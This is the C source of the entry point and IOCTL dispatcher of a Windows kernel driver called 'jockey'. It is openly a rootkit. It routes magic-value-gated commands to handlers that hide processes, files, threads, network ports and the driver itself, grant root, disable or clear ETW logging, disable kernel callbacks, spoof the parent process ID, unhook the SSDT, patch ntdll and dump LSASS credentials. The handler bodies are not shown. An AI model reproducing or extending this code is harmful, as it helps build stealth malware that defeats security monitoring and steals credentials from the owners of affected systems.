#include "jockey_common.h"

/*
 * jockey_driver.c ??? Driver entry, dispatch, and IOCTL router.
 *
 * This is the main driver file that ties all modules together.
 */

#include "jockey.h"

extern NTSTATUS jockey_ioctl_hide_pid(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_unhide_pid(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_hide_file(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_unhide_file(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_get_root(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_kill_pid(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_disable_etw(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_disable_ob_callbacks(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_hide_driver(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_protect_mem(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_disable_callbacks(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_hide_thread(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_spoof_ppid(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_clear_etw(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_dump_lsass(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_hide_port(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_process_shield(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_unhook_ssdt(PIRP, ULONG, ULONG);
extern NTSTATUS jockey_ioctl_patch_ntdll(PIRP, ULONG, ULONG);

static PDEVICE_OBJECT g_jockey_device = NULL;
static UNICODE_STRING g_dev_name;
static UNICODE_STRING g_symlink;

static FAST_MUTEX g_list_lock;
static struct jky_hidden_pid *g_hidden_pids = NULL;
static struct jky_hidden_file *g_hidden_files = NULL;
static struct jky_hidden_thread *g_hidden_threads = NULL;

static NTSTATUS jockey_ioctl_dispatcher(PDEVICE_OBJECT dev, PIRP irp);
static NTSTATUS jockey_create_close(PDEVICE_OBJECT dev, PIRP irp);

/* ---- DriverEntry ---- */

NTSTATUS jockey_driver_secondary_entry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)
{
    NTSTATUS status;
    USHORT i;

    UNREFERENCED_PARAMETER(reg_path);

    DbgPrint("[jockey] DriverEntry loaded\n");

    ExInitializeFastMutex(&g_list_lock);

    RtlInitUnicodeString(&g_dev_name, JKY_DEVICE_NAME);
    status = IoCreateDevice(driver, 0, &g_dev_name,
                            FILE_DEVICE_UNKNOWN, 0, FALSE, &g_jockey_device);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[jockey] IoCreateDevice failed: 0x%X\n", status);
        return status;
    }

    RtlInitUnicodeString(&g_symlink, JKY_SYMLINK_NAME);
    status = IoCreateSymbolicLink(&g_symlink, &g_dev_name);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[jockey] IoCreateSymbolicLink failed: 0x%X\n", status);
        IoDeleteDevice(g_jockey_device);
        return status;
    }

    for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
        driver->MajorFunction[i] = jockey_create_close;

    driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = jockey_ioctl_dispatcher;
    driver->DriverUnload = NULL;

    g_jockey_device->Flags |= DO_BUFFERED_IO;
    g_jockey_device->Flags &= ~DO_DEVICE_INITIALIZING;

    DbgPrint("[jockey] \\\\.\\Jockey ready\n");
    return STATUS_SUCCESS;
}

/* ---- Create / Close ---- */

static NTSTATUS jockey_create_close(PDEVICE_OBJECT dev, PIRP irp)
{
    UNREFERENCED_PARAMETER(dev);
    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

/* ---- IOCTL dispatcher ---- */

static NTSTATUS jockey_ioctl_dispatcher(PDEVICE_OBJECT dev, PIRP irp)
{
    PIO_STACK_LOCATION irp_sp = IoGetCurrentIrpStackLocation(irp);
    ULONG ctl_code = irp_sp->Parameters.DeviceIoControl.IoControlCode;
    ULONG in_len = irp_sp->Parameters.DeviceIoControl.InputBufferLength;
    ULONG out_len = irp_sp->Parameters.DeviceIoControl.OutputBufferLength;
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
    uint32_t magic;

    UNREFERENCED_PARAMETER(dev);

    if (in_len < sizeof(uint32_t)) {
        irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
        IoCompleteRequest(irp, IO_NO_INCREMENT);
        return STATUS_INVALID_PARAMETER;
    }

    magic = *(uint32_t *)irp->AssociatedIrp.SystemBuffer;
    if (magic != JKY_IOCTL_MAGIC) {
        irp->IoStatus.Status = STATUS_ACCESS_DENIED;
        IoCompleteRequest(irp, IO_NO_INCREMENT);
        return STATUS_ACCESS_DENIED;
    }

    switch (ctl_code) {
    case JKY_IOCTL_PING:
        status = STATUS_SUCCESS;
        *(uint32_t *)irp->AssociatedIrp.SystemBuffer = JKY_IOCTL_MAGIC;
        irp->IoStatus.Information = sizeof(uint32_t);
        break;

    case JKY_IOCTL_HIDE_PID:         status = jockey_ioctl_hide_pid(irp, in_len, out_len); break;
    case JKY_IOCTL_UNHIDE_PID:       status = jockey_ioctl_unhide_pid(irp, in_len, out_len); break;
    case JKY_IOCTL_HIDE_FILE:        status = jockey_ioctl_hide_file(irp, in_len, out_len); break;
    case JKY_IOCTL_UNHIDE_FILE:      status = jockey_ioctl_unhide_file(irp, in_len, out_len); break;
    case JKY_IOCTL_GET_ROOT:         status = jockey_ioctl_get_root(irp, in_len, out_len); break;
    case JKY_IOCTL_KILL_PID:         status = jockey_ioctl_kill_pid(irp, in_len, out_len); break;
    case JKY_IOCTL_DISABLE_ETW:      status = jockey_ioctl_disable_etw(irp, in_len, out_len); break;
    case JKY_IOCTL_DISABLE_OB_CB:    status = jockey_ioctl_disable_ob_callbacks(irp, in_len, out_len); break;
    case JKY_IOCTL_HIDE_DRIVER:      status = jockey_ioctl_hide_driver(irp, in_len, out_len); break;
    case JKY_IOCTL_PROTECT_MEM:      status = jockey_ioctl_protect_mem(irp, in_len, out_len); break;
    case JKY_IOCTL_DISABLE_CALLBACKS: status = jockey_ioctl_disable_callbacks(irp, in_len, out_len); break;
    case JKY_IOCTL_HIDE_THREAD:      status = jockey_ioctl_hide_thread(irp, in_len, out_len); break;
    case JKY_IOCTL_SPOOF_PPID:       status = jockey_ioctl_spoof_ppid(irp, in_len, out_len); break;
    case JKY_IOCTL_CLEAR_ETW:        status = jockey_ioctl_clear_etw(irp, in_len, out_len); break;
    case JKY_IOCTL_DUMP_LSASS:       status = jockey_ioctl_dump_lsass(irp, in_len, out_len); break;
    case JKY_IOCTL_HIDE_PORT:        status = jockey_ioctl_hide_port(irp, in_len, out_len); break;
    case JKY_IOCTL_PROCESS_SHIELD:   status = jockey_ioctl_process_shield(irp, in_len, out_len); break;
    case JKY_IOCTL_UNHOOK_SSDT:      status = jockey_ioctl_unhook_ssdt(irp, in_len, out_len); break;
    case JKY_IOCTL_PATCH_NTDLL:      status = jockey_ioctl_patch_ntdll(irp, in_len, out_len); break;

    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    irp->IoStatus.Status = status;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return status;
}



